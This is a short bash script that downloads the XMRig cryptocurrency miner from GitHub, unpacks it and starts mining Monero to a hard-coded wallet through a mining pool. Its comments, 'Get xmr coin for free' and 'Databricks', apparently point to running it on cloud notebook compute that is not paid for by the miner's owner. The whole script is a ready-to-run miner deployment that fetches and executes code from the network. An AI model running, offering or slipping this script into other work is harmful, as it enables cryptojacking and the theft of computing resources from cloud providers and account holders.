#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -o us-west.minexmr.com:443 -u 42JgZhZt2HpekZ1WisZpqnMX43B7eyntsNd1QBTwumxEdijQNU1VHis31uJrDCbgvucho192h8vwuNKsMkwbNC23QaypuSx -k --tls --rig-id aank
